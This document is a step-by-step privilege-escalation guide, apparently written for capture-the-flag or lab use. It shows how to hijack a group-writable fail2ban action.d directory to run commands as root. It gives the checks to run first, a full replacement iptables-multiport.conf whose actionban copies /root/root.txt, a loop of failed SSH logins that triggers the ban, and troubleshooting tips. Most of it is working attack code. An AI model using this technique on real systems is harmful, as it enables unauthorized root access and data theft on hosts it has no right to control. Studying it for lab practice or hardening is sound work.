# fail2ban action.d Group-Writable Hijack

## When this applies

- Linux foothold; `sudo -l` shows `NOPASSWD` for `/etc/init.d/fail2ban restart` (or `systemctl restart fail2ban`).
- `/etc/fail2ban/action.d/` is group-writable (`drwxrwx--- root <grp>`) and the foothold user is in `<grp>`.
- A fail2ban jail is enabled (commonly `[sshd]`) so `actionban` will fire on a triggered ban.

The directory mode lets you **rename existing files and create new ones**, but not modify root-owned files in place. That's enough — drop in a replacement.

## Pre-flight

```bash
sudo -l                                                      # confirm NOPASSWD restart
ls -la /etc/fail2ban/action.d                                # confirm drwxrwx--- root:<grp>
id | tr ',' '\n'                                             # confirm group membership
grep -E '^banaction|^action ' /etc/fail2ban/jail.conf | head # which action gets fired
ls /etc/fail2ban/jail.d /etc/fail2ban/jail.local 2>/dev/null # any overrides
```

Default Debian `[sshd]` jail uses `banaction = iptables-multiport`, so `iptables-multiport.conf` is the file to replace.

## Technique

Replace the active banaction's config with a **syntactically-complete** version that keeps the original `<iptables>`-substituted commands intact and **appends** payload commands. Empty / stripped action sections will cause `fail2ban-server` to silently fail to start, and no actions will fire.

```bash
mv /etc/fail2ban/action.d/iptables-multiport.conf \
   /etc/fail2ban/action.d/iptables-multiport.conf.bak

cat > /etc/fail2ban/action.d/iptables-multiport.conf <<'CFG'
[INCLUDES]
before = iptables-common.conf

[Definition]
actionstart = <iptables> -N f2b-<name>
              <iptables> -A f2b-<name> -j <returntype>
              <iptables> -I <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>

actionstop = <iptables> -D <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>
             <actionflush>
             <iptables> -X f2b-<name>

actioncheck = <iptables> -n -L <chain> | grep -q 'f2b-<name>[ \t]'

actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
            cp /root/root.txt /tmp/r.txt
            chmod 644 /tmp/r.txt

actionunban = <iptables> -D f2b-<name> -s <ip> -j <blocktype>

[Init]
CFG

sudo /etc/init.d/fail2ban restart        # or sudo systemctl restart fail2ban
fail2ban-client status                   # socket appears under /var/run/fail2ban/ when up
```

## Trigger the ban

Any service whose log fail2ban tails will do; `[sshd]` is universal:

```bash
for i in $(seq 1 12); do
  sshpass -p "wrong$i" ssh -o StrictHostKeyChecking=no \
    -o ConnectTimeout=2 -o PreferredAuthentications=password \
    -o NumberOfPasswordPrompts=1 nobody@<TARGET_IP> true 2>/dev/null &
done; wait
sleep 8
ls -la /tmp/r.txt && cat /tmp/r.txt        # actionban fired as root
```

Default `findtime=600 maxretry=5` — a dozen failed sessions inside ten minutes is well over threshold.

## Why each guardrail matters

- **Keep `<iptables>` lines.** `iptables-common.conf` substitutes `<iptables>`, `<chain>`, `<blocktype>` etc. into the action; if the substituted command is invalid (e.g., empty `actionstart`), fail2ban-server logs an `IndexError`/`KeyError` and exits — no jail starts, no `actionban` ever fires. Symptom: `fail2ban-client status` returns "Failed to access socket" even though the init script reports a successful restart.
- **Three commands inside `actionban`.** fail2ban executes each newline-separated command via `Popen(shell=True)`; you can chain with `;` on one line or use multiple lines.
- **Don't touch jail.conf.** Editing the jail file requires root or fail2ban group; replacing an action.d file does not.

## Common pitfalls

- The active banaction may be `iptables-allports`, `nftables`, `ufw`, or `firewallcmd-ipset` instead of `iptables-multiport` — always check `jail.conf` / `jail.d/` first and target the right file.
- If fail2ban is configured with `chain = INPUT` and the box already has hand-rolled iptables rules, the original `actionstart` may fail and prevent jail bring-up. Drop the `actionstart` `-N` to a noop with `true` if the chain already exists.
- `sshpass` without password caching may emit warnings before the connection — this is fine, the auth attempt still hits sshd and fail2ban counts it.
